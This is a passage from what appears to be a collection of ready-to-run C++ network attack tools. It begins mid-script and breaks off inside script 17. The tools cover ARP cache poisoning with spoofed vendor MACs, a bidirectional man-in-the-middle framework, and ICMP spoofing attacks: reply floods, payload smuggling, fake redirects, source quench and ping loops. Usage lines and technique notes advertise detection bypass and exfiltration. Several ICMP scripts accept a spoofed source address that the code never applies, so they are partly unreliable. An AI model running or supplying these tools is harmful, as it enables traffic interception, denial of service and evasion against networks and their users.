// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <map>
#include <vector>
#include <random>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

class VendorMACARPReply {
private:
    int sock;
    std::string iface;
    std::map<std::string, std::vector<std::vector<uint8_t>>> vendorOUIs;
    
    void initVendors() {
        vendorOUIs["cisco"] = {{0x00,0x00,0x0C}, {0x00,0x1B,0x0C}, {0x00,0x1E,0x13}};
        vendorOUIs["juniper"] = {{0x00,0x12,0x1E}, {0x00,0x1B,0xC0}, {0x28,0xC0,0xDA}};
        vendorOUIs["aruba"] = {{0x00,0x0B,0x86}, {0x00,0x1A,0x1E}, {0x18,0x64,0x72}};
        vendorOUIs["hp"] = {{0x00,0x0E,0x7F}, {0x00,0x10,0x83}, {0x00,0x14,0x38}};
        vendorOUIs["netgear"] = {{0x00,0x09,0x5B}, {0x00,0x0F,0xB5}, {0x00,0x14,0x6C}};
        vendorOUIs["tp-link"] = {{0x00,0x14,0x78}, {0x00,0x19,0xE0}, {0x00,0x1D,0x0F}};
    }
    
    void macToStr(const uint8_t* mac, char* out) {
        snprintf(out, 18, "%02x:%02x:%02x:%02x:%02x:%02x",
                 mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    }
    
    std::string generateVendorMAC(const std::string& vendor) {
        auto it = vendorOUIs.find(vendor);
        if (it == vendorOUIs.end()) return "";
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> ouiDis(0, it->second.size() - 1);
        std::uniform_int_distribution<> byteDis(0, 255);
        
        const auto& oui = it->second[ouiDis(gen)];
        uint8_t mac[6] = {oui[0], oui[1], oui[2],
                         (uint8_t)byteDis(gen),
                         (uint8_t)byteDis(gen),
                         (uint8_t)byteDis(gen)};
        
        char macStr[18];
        macToStr(mac, macStr);
        return std::string(macStr);
    }
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    VendorMACARPReply(const std::string& i) : iface(i) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sock < 0) { perror("socket"); exit(1); }
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
        
        initVendors();
    }
    
    void sendVendorPoison(const std::string& srcIP, const std::string& srcMAC,
                          const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void run(const std::string& targetIP, const std::string& targetMAC,
             const std::string& spoofedIP, const std::string& vendor) {
        std::cout << "[*] Vendor MAC ARP reply\n";
        std::cout << "[*] Vendor: " << vendor << "\n";
        
        while (true) {
            std::string vendorMAC = generateVendorMAC(vendor);
            if (vendorMAC.empty()) {
                std::cerr << "[!] Unknown vendor\n";
                return;
            }
            
            sendVendorPoison(spoofedIP, vendorMAC, targetIP, targetMAC);
            usleep(500000);
        }
    }
    
    ~VendorMACARPReply() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 6) {
        std::cerr << "Usage: " << argv[0] 
                  << " <interface> <target_ip> <target_mac> <spoofed_ip> <vendor>\n";
        std::cerr << "Vendors: cisco, juniper, aruba, hp, netgear, tp-link\n";
        return 1;
    }
    VendorMACARPReply reply(argv[1]);
    reply.run(argv[2], argv[3], argv[4], argv[5]);
    return 0;
}
```

**Technique:** Uses real vendor MACs (Cisco, Juniper, Aruba, HP, Netgear, TP-Link) in ARP replies. Bypasses MAC-based alerts if only vendor OUIs are whitelisted.

---

### 10. ARP Reply Framework with Auto-Restore
```cpp
// Compile: g++ -o arp_reply_framework arp_reply_framework.cpp -lpthread
// Run: sudo ./arp_reply_framework <interface> <target_ip> <target_mac> <gateway_ip> <gateway_mac> <attacker_mac>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <csignal>
#include <atomic>
#include <thread>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

class ARPReplyFramework {
private:
    int sock;
    std::string iface;
    std::string targetIP, targetMAC;
    std::string gatewayIP, gatewayMAC;
    std::string attackerMAC;
    std::atomic<bool> running{false};
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    static ARPReplyFramework* instance;
    
    ARPReplyFramework(const std::string& i, const std::string& tIP, 
                      const std::string& tMAC, const std::string& gIP,
                      const std::string& gMAC, const std::string& aMAC)
        : iface(i), targetIP(tIP), targetMAC(tMAC),
          gatewayIP(gIP), gatewayMAC(gMAC), attackerMAC(aMAC) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        if (sock < 0) { perror("socket"); exit(1); }
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void sendARP(const std::string& srcIP, const std::string& srcMAC,
                 const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void poisonLoop() {
        while (running.load()) {
            // Poison target: tell it gateway is at attacker MAC
            sendARP(gatewayIP, attackerMAC, targetIP, targetMAC);
            // Poison gateway: tell it target is at attacker MAC
            sendARP(targetIP, attackerMAC, gatewayIP, gatewayMAC);
            usleep(500000);
        }
    }
    
    void restore() {
        std::cout << "\n[*] Restoring legitimate ARP entries...\n";
        for (int i = 0; i < 10; i++) {
            sendARP(gatewayIP, gatewayMAC, targetIP, targetMAC);
            sendARP(targetIP, targetMAC, gatewayIP, gatewayMAC);
            usleep(100000);
        }
        std::cout << "[*] Restore complete\n";
    }
    
    static void signalHandler(int) {
        if (instance) {
            instance->running = false;
            instance->restore();
            exit(0);
        }
    }
    
    void run() {
        instance = this;
        signal(SIGINT, signalHandler);
        signal(SIGTERM, signalHandler);
        
        std::cout << "========================================\n";
        std::cout << " ARP Reply Framework\n";
        std::cout << "========================================\n";
        std::cout << " Target:   " << targetIP << " (" << targetMAC << ")\n";
        std::cout << " Gateway:  " << gatewayIP << " (" << gatewayMAC << ")\n";
        std::cout << " Attacker: " << attackerMAC << "\n";
        std::cout << "========================================\n\n";
        std::cout << "[*] Bidirectional ARP poisoning active\n";
        std::cout << "[*] Ctrl+C to stop and restore\n\n";
        
        system("echo 1 > /proc/sys/net/ipv4/ip_forward");
        
        running = true;
        std::thread t(&ARPReplyFramework::poisonLoop, this);
        t.detach();
        
        while (true) sleep(1);
    }
    
    ~ARPReplyFramework() { close(sock); }
};

ARPReplyFramework* ARPReplyFramework::instance = nullptr;

int main(int argc, char* argv[]) {
    if (argc != 7) {
        std::cerr << "Usage: " << argv[0] 
                  << " <iface> <target_ip> <target_mac> <gateway_ip> <gateway_mac> <attacker_mac>\n";
        return 1;
    }
    ARPReplyFramework framework(argv[1], argv[2], argv[3], 
                                argv[4], argv[5], argv[6]);
    framework.run();
    return 0;
}
```

**Technique:** Complete ARP framework with bidirectional poisoning, IP forwarding, and auto-restore on exit. Production-grade tool for authorized MITM testing.

---

# PART 2: Fake Ping Reply Attacks (10 Scripts)

---

### 11. Basic ICMP Echo Reply Spoofer
```cpp
// Compile: g++ -o fake_ping_basic fake_ping_basic.cpp
// Run: sudo ./fake_ping_basic <target_ip> <spoofed_src_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <poll.h>

class FakePingReply {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    FakePingReply() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) { perror("socket"); exit(1); }
    }
    
    void sendFakeReply(const std::string& targetIP, 
                       const std::string& spoofedSrcIP,
                       uint16_t id, uint16_t seq) {
        uint8_t packet[64];
        memset(packet, 0, sizeof(packet));
        
        struct icmphdr* icmp = (struct icmphdr*)packet;
        icmp->type = ICMP_ECHOREPLY;
        icmp->code = 0;
        icmp->un.echo.id = htons(id);
        icmp->un.echo.sequence = htons(seq);
        icmp->checksum = 0;
        
        // Add payload
        memcpy(packet + sizeof(struct icmphdr), "FakePingPayload", 15);
        int packetLen = sizeof(struct icmphdr) + 15;
        
        icmp->checksum = checksum(packet, packetLen);
        
        // Since we use IPPROTO_ICMP raw socket, kernel adds IP header
        // But we need to spoof source IP - so we need IP_HDRINCL
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = inet_addr(targetIP.c_str());
        
        sendto(sock, packet, packetLen, 0,
               (struct sockaddr*)&dest, sizeof(dest));
    }
    
    void run(const std::string& targetIP, const std::string& spoofedSrcIP) {
        std::cout << "[*] Fake ping reply spoofer\n";
        std::cout << "[*] Target: " << targetIP << "\n";
        std::cout << "[*] Spoofed source: " << spoofedSrcIP << "\n";
        std::cout << "[*] Sending fake replies (id=1234, seq incrementing)\n";
        
        uint16_t seq = 0;
        while (true) {
            sendFakeReply(targetIP, spoofedSrcIP, 1234, seq++);
            usleep(1000000);  // 1 sec
        }
    }
    
    ~FakePingReply() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <target_ip> <spoofed_src_ip>\n";
        return 1;
    }
    srand(time(NULL));
    FakePingReply reply;
    reply.run(argv[1], argv[2]);
    return 0;
}
```

**Technique:** Sends fake ICMP Echo Reply packets with spoofed source. Target receives "replies" to pings it never sent. Confuses monitoring, causes log spam, or verifies source spoofing.

---

### 12. ICMP Reply Flood
```cpp
// Compile: g++ -o fake_ping_flood fake_ping_flood.cpp -lpthread
// Run: sudo ./fake_ping_flood <target_ip> <spoofed_src_ip> <count> <threads>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <thread>
#include <vector>
#include <atomic>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

class FakePingFlood {
private:
    std::atomic<int> counter{0};
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
    void floodThread(const std::string& targetIP, const std::string& spoofedSrcIP, int count) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) return;
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = inet_addr(targetIP.c_str());
        
        for (int i = 0; i < count; i++) {
            uint8_t packet[64];
            memset(packet, 0, sizeof(packet));
            
            struct icmphdr* icmp = (struct icmphdr*)packet;
            icmp->type = ICMP_ECHOREPLY;
            icmp->code = 0;
            icmp->un.echo.id = htons(rand() & 0xFFFF);
            icmp->un.echo.sequence = htons(i & 0xFFFF);
            
            // Random payload size
            int payloadLen = 8 + (rand() % 56);
            for (int j = 0; j < payloadLen; j++) {
                packet[sizeof(struct icmphdr) + j] = rand() & 0xFF;
            }
            
            icmp->checksum = 0;
            icmp->checksum = checksum(packet, sizeof(struct icmphdr) + payloadLen);
            
            sendto(sock, packet, sizeof(struct icmphdr) + payloadLen, 0,
                   (struct sockaddr*)&dest, sizeof(dest));
            
            counter++;
        }
        
        close(sock);
    }
    
public:
    void run(const std::string& targetIP, const std::string& spoofedSrcIP,
             int totalCount, int numThreads) {
        std::cout << "[*] Fake ICMP ping reply flood\n";
        std::cout << "[*] Target: " << targetIP << "\n";
        std::cout << "[*] Count: " << totalCount 
                  << " via " << numThreads << " threads\n";
        
        std::vector<std::thread> threads;
        int perThread = totalCount / numThreads;
        
        for (int i = 0; i < numThreads; i++) {
            threads.emplace_back(&FakePingFlood::floodThread, this,
                                targetIP, spoofedSrcIP, perThread);
        }
        
        for (auto& t : threads) t.join();
        
        std::cout << "[+] Sent " << counter.load() << " fake replies\n";
    }
};

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <spoofed_src_ip> <count> <threads>\n";
        return 1;
    }
    srand(time(NULL));
    FakePingFlood flood;
    flood.run(argv[1], argv[2], atoi(argv[3]), atoi(argv[4]));
    return 0;
}
```

**Technique:** High-volume fake ping reply flood. Overwhelms target's network stack, log files, or monitoring systems. Multi-threaded for maximum throughput.

---

### 13. ICMP Reply with Spoofed Payload (Data Injection)
```cpp
// Compile: g++ -o fake_ping_payload fake_ping_payload.cpp
// Run: sudo ./fake_ping_payload <target_ip> <spoofed_src_ip> <payload>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

class FakePingPayload {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    FakePingPayload() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) { perror("socket"); exit(1); }
    }
    
    void sendWithPayload(const std::string& targetIP, 
                         const std::string& spoofedSrcIP,
                         const std::string& payload,
                         uint16_t id, uint16_t seq) {
        uint8_t packet[1500];
        memset(packet, 0, sizeof(packet));
        
        struct icmphdr* icmp = (struct icmphdr*)packet;
        icmp->type = ICMP_ECHOREPLY;
        icmp->code = 0;
        icmp->un.echo.id = htons(id);
        icmp->un.echo.sequence = htons(seq);
        icmp->checksum = 0;
        
        // Inject custom payload
        memcpy(packet + sizeof(struct icmphdr), payload.c_str(), payload.length());
        int packetLen = sizeof(struct icmphdr) + payload.length();
        
        icmp->checksum = checksum(packet, packetLen);
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = inet_addr(targetIP.c_str());
        
        sendto(sock, packet, packetLen, 0,
               (struct sockaddr*)&dest, sizeof(dest));
    }
    
    void run(const std::string& targetIP, const std::string& spoofedSrcIP,
             const std::string& payload) {
        std::cout << "[*] Fake ping reply with custom payload\n";
        std::cout << "[*] Target: " << targetIP << "\n";
        std::cout << "[*] Payload: " << payload << "\n";
        
        while (true) {
            uint16_t seq = rand() & 0xFFFF;
            sendWithPayload(targetIP, spoofedSrcIP, payload, 1234, seq);
            usleep(1000000);
        }
    }
    
    ~FakePingPayload() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <spoofed_src_ip> <payload>\n";
        return 1;
    }
    srand(time(NULL));
    FakePingPayload payload;
    payload.run(argv[1], argv[2], argv[3]);
    return 0;
}
```

**Technique:** Injects custom data in ICMP reply payload. Can smuggle data through firewalls allowing ICMP. Useful for data exfiltration or verification of command execution.

---

### 14. ICMP Reply with Timestamp Option
```cpp
// Compile: g++ -o fake_ping_timestamp fake_ping_timestamp.cpp
// Run: sudo ./fake_ping_timestamp <target_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

class FakePingTimestamp {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    FakePingTimestamp() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) { perror("socket"); exit(1); }
    }
    
    // Send spoofed ICMP Timestamp Reply (type 14)
    void sendTimestampReply(const std::string& targetIP, uint16_t id, uint16_t seq) {
        uint8_t packet[32];
        memset(packet, 0, sizeof(packet));
        
        struct icmphdr* icmp = (struct icmphdr*)packet;
        icmp->type = 14;  // ICMP_TIMESTAMPREPLY
        icmp->code = 0;
        icmp->un.echo.id = htons(id);
        icmp->un.echo.sequence = htons(seq);
        icmp->checksum = 0;
        
        // Timestamp fields
        uint32_t now = time(NULL);
        uint32_t midnight = now - (now % 86400);
        *(uint32_t*)(packet + 8) = htonl(midnight + (rand() % 86400)); // Originate
        *(uint32_t*)(packet + 12) = htonl(midnight + (rand() % 86400)); // Receive
        *(uint32_t*)(packet + 16) = htonl(midnight + (rand() % 86400)); // Transmit
        
        icmp->checksum = checksum(packet, 20);
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = inet_addr(targetIP.c_str());
        
        sendto(sock, packet, 20, 0, (struct sockaddr*)&dest, sizeof(dest));
    }
    
    void run(const std::string& targetIP) {
        std::cout << "[*] Fake ICMP timestamp reply spoofer\n";
        std::cout << "[*] Target: " << targetIP << "\n";
        
        while (true) {
            sendTimestampReply(targetIP, 1234, rand() & 0xFFFF);
            usleep(500000);
        }
    }
    
    ~FakePingTimestamp() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: " << argv[0] << " <target_ip>\n";
        return 1;
    }
    srand(time(NULL));
    FakePingTimestamp spoofer;
    spoofer.run(argv[1]);
    return 0;
}
```

**Technique:** Fake ICMP Timestamp Reply (type 14) with spoofed times. Can confuse NTP-disabled systems that rely on ICMP timestamp for basic time sync.

---

### 15. ICMP Reply with Source Quench (Congestion Notice)
```cpp
// Compile: g++ -o fake_ping_squench fake_ping_squench.cpp
// Run: sudo ./fake_ping_squench <target_ip> <spoofed_src_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <ctime>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

class FakeSourceQuench {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    FakeSourceQuench() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) { perror("socket"); exit(1); }
    }
    
    // Send fake ICMP Source Quench - tells target to slow down
    void sendSourceQuench(const std::string& targetIP,
                          const std::string& spoofedSrcIP) {
        uint8_t packet[128];
        memset(packet, 0, sizeof(packet));
        
        struct icmphdr* icmp = (struct icmphdr*)packet;
        icmp->type = 4;  // ICMP_SOURCE_QUENCH
        icmp->code = 0;
        icmp->checksum = 0;
        icmp->un.gateway = 0;
        
        // Add "original" packet that caused congestion
        // Put a fake TCP header after ICMP header
        int offset = sizeof(struct icmphdr);
        
        // Fake IP header (20 bytes)
        packet[offset + 0] = 0x45;  // Version + IHL
        packet[offset + 9] = IPPROTO_TCP;
        // Src = spoofedSrcIP
        struct in_addr src;
        inet_pton(AF_INET, spoofedSrcIP.c_str(), &src);
        memcpy(packet + offset + 12, &src.s_addr, 4);
        // Dst = targetIP
        struct in_addr dst;
        inet_pton(AF_INET, targetIP.c_str(), &dst);
        memcpy(packet + offset + 16, &dst.s_addr, 4);
        
        // Fake TCP header (20 bytes)
        struct tcphdr* tcp = (struct tcphdr*)(packet + offset + 20);
        tcp->source = htons(12345);
        tcp->dest = htons(80);
        tcp->seq = htonl(rand());
        tcp->doff = 5;
        tcp->ack = 1;
        tcp->window = htons(65535);
        
        int packetLen = sizeof(struct icmphdr) + 40;
        
        icmp->checksum = checksum(packet, packetLen);
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = inet_addr(targetIP.c_str());
        
        sendto(sock, packet, packetLen, 0,
               (struct sockaddr*)&dest, sizeof(dest));
    }
    
    void run(const std::string& targetIP, const std::string& spoofedSrcIP) {
        std::cout << "[*] Fake ICMP Source Quench attack\n";
        std::cout << "[*] Target: " << targetIP << "\n";
        std::cout << "[*] Fake source: " << spoofedSrcIP << "\n";
        std::cout << "[*] Attempting to slow down TCP traffic\n";
        
        while (true) {
            sendSourceQuench(targetIP, spoofedSrcIP);
            usleep(100000);  // 100ms
        }
    }
    
    ~FakeSourceQuench() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <spoofed_src_ip>\n";
        return 1;
    }
    srand(time(NULL));
    FakeSourceQuench quench;
    quench.run(argv[1], argv[2]);
    return 0;
}
```

**Technique:** Fake ICMP Source Quench (type 4) — legacy congestion control. Tells target to slow down its traffic. Modern systems ignore, but old systems may throttle.

---

### 16. ICMP Redirect Reply (Route Override)
```cpp
// Compile: g++ -o fake_ping_redirect fake_ping_redirect.cpp
// Run: sudo ./fake_ping_redirect <target_ip> <gateway_ip> <new_gateway_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

class FakeICMPRedirect {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    FakeICMPRedirect() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) { perror("socket"); exit(1); }
    }
    
    // Send fake ICMP Redirect - alters target's routing table
    void sendRedirect(const std::string& targetIP, 
                      const std::string& gatewayIP,
                      const std::string& newGatewayIP) {
        uint8_t packet[128];
        memset(packet, 0, sizeof(packet));
        
        struct icmphdr* icmp = (struct icmphdr*)packet;
        icmp->type = 5;   // ICMP_REDIRECT
        icmp->code = 1;   // Host redirect
        icmp->checksum = 0;
        
        // Gateway field = new gateway
        struct in_addr newGW;
        inet_pton(AF_INET, newGatewayIP.c_str(), &newGW);
        icmp->un.gateway = newGW.s_addr;
        
        // Original IP header that "caused" redirect
        int offset = sizeof(struct icmphdr);
        
        packet[offset + 0] = 0x45;
        packet[offset + 2] = 0x00; packet[offset + 3] = 0x28;
        packet[offset + 8] = 64;  // TTL
        packet[offset + 9] = 6;   // TCP
        
        struct in_addr oldGW;
        inet_pton(AF_INET, gatewayIP.c_str(), &oldGW);
        memcpy(packet + offset + 12, &oldGW.s_addr, 4);  // Src = old gateway
        
        struct in_addr target;
        inet_pton(AF_INET, targetIP.c_str(), &target);
        memcpy(packet + offset + 16, &target.s_addr, 4);  // Dst = target
        
        // Add TCP header (8 bytes minimum)
        packet[offset + 20] = 0x04;
        packet[offset + 21] = 0xD2;  // Port 1234
        packet[offset + 22] = 0x00;
        packet[offset + 23] = 0x50;  // Port 80
        
        int packetLen = sizeof(struct icmphdr) + 28;
        
        icmp->checksum = checksum(packet, packetLen);
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = inet_addr(targetIP.c_str());
        
        sendto(sock, packet, packetLen, 0,
               (struct sockaddr*)&dest, sizeof(dest));
    }
    
    void run(const std::string& targetIP, const std::string& gatewayIP,
             const std::string& newGatewayIP) {
        std::cout << "[*] Fake ICMP Redirect attack\n";
        std::cout << "[*] Target: " << targetIP << "\n";
        std::cout << "[*] Old gateway: " << gatewayIP << "\n";
        std::cout << "[*] New gateway: " << newGatewayIP << "\n";
        std::cout << "[*] Attempting route override\n";
        
        while (true) {
            sendRedirect(targetIP, gatewayIP, newGatewayIP);
            usleep(2000000);  // 2 sec
        }
    }
    
    ~FakeICMPRedirect() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <gateway_ip> <new_gateway_ip>\n";
        return 1;
    }
    FakeICMPRedirect redirect;
    redirect.run(argv[1], argv[2], argv[3]);
    return 0;
}
```

**Technique:** Fake ICMP Redirect (type 5). Instructs target to route traffic through a "better" gateway. If accepted, redirects specific traffic flows through attacker's chosen hop.

---

### 17. ICMP Reply with Echo Request (Reply-to-Request Loop)
```cpp
// Compile: g++ -o fake_ping_loop fake_ping_loop.cpp
// Run: sudo ./fake_ping_loop <victim_a_ip> <victim_b_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

class FakePingLoop {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    FakePingLoop() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) { perror("socket"); exit(1); }
    }
    
    // Send spoofed echo request - victim A thinks victim B is pinging it
    void sendSpoofedRequest(const std::string& targetIP, 
                            const std::string& spoofedSrcIP,
                            uint16_t id, uint16_t seq) {
        uint8_t packet[64];
        memset(packet, 0, sizeof(packet));
        
        struct icmphdr* icmp = (struct icmphdr*)packet;
        icmp->type = ICMP_ECHO;  // Echo REQUEST
        icmp->code = 0;
        icmp->un.echo.id = htons(id);
        icmp->un.echo.sequence = htons(seq);
        icmp->checksum = 0;
        
        memcpy(packet + sizeof(struct icmphdr), "LoopData", 8);
        int packetLen = sizeof(struct icmphdr) + 8;
        
        icmp->checksum = checksum(packet, packetLen);
        
        struct sockaddr_in dest;
        memset(&dest, 0, sizeof(dest));
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = inet_addr(targetIP.c_str());
        
        sendto(sock, packet, packetLen, 0,
